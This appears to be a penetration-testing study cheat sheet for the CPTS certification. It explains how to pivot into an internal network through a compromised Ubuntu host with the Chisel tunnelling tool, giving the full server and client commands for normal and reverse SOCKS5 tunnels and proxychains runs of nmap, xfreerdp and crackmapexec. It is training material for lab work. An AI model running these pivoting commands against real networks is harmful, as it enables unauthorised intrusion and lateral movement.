🔧 What Is Chisel?
Chisel is a lightweight, Go-based tunneling tool that:

Uses HTTP/WebSocket to tunnel data

Creates SOCKS5 tunnels for pivoting

Works through firewalls and NAT

Can run in both normal and reverse modes

Is a faster, leaner alternative to things like SSH or full proxychains when you need just a pivot

🧠 Why Should You Care?
Some labs or real-world targets block reverse shells, but allow outbound HTTP/WebSocket.

You don’t always want to (or can’t) set up SSH keys and all that jazz — Chisel’s like a drop-in, one-binary setup.

Can do SOCKS5 pivoting, which means once it's up, your tools (Nmap, RDP, SMB, etc.) all just work through proxychains.

✅ TL;DR Chisel Normal Flow
Scenario: You own a Linux box inside 172.16.5.0/23. You want to pivot into that network from your attack box.

🔹 On Pivot Host (Compromised Ubuntu)
bash
Copy
Edit
./chisel server -v -p 1234 --socks5
That exposes a SOCKS5 server over WebSocket on port 1234.

🔹 On Your Attack Box
bash
Copy
Edit
./chisel client -v 10.129.202.64:1234 socks
This connects back, and listens on 127.0.0.1:1080 — now a tunnel exists through the compromised machine.

🔹 On Attack Box — Edit proxychains.conf
bash
Copy
Edit
socks5 127.0.0.1 1080
🔹 Use it!
bash
Copy
Edit
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
🔁 Reverse Chisel Flow
Use when: Pivot box (Ubuntu) has no inbound allowed, but can reach you (your attack box).

🔹 On Your Attack Box (Chisel Server)
bash
Copy
Edit
./chisel server --reverse -v -p 1234 --socks5
🔹 On Pivot Host (Client to you!)
bash
Copy
Edit
./chisel client -v 10.10.14.18:1234 R:socks
Now the connection is reversed — the attack box listens, the pivot box dials out and SOCKS5 still ends up on 127.0.0.1:1080 on your machine.

You reuse:

bash
Copy
Edit
socks5 127.0.0.1 1080
Then:

bash
Copy
Edit
proxychains nmap / xfreerdp / crackmapexec / whatever
🧪 Common Use-Cases
Scenario	Use Chisel?
Can't SSH into pivot?	✅ Reverse Chisel
Need fast SOCKS5 tunnel?	✅
Need HTTP/WebSocket tunneling?	✅
Port forwarding single port?	❌ Use ssh -L or plink
More flexibility with tools like proxychains?	✅ Chisel + SOCKS5
Windows target only speaks HTTP out?	✅ (but needs x64 Go binary)
Want pure stealth + encrypted C2?	❌ Use dnscat2 or Meterpreter
⚠️ Pro Tip
If it fails to run on target due to glibc or compatibility issues:

Grab older static binaries from Chisel’s GitHub releases

Or compile statically with older Go versions if you're feeling spicy

🧠 Takeaway for CPTS + Real-World
This is a great pivot tool to know and use.

You won’t always need it for CPTS, but when SSH is off the table, Chisel is your boy.

CPTS might lean into SSH or Meterpreter routes — but they’ll respect a pivot done with Chisel.
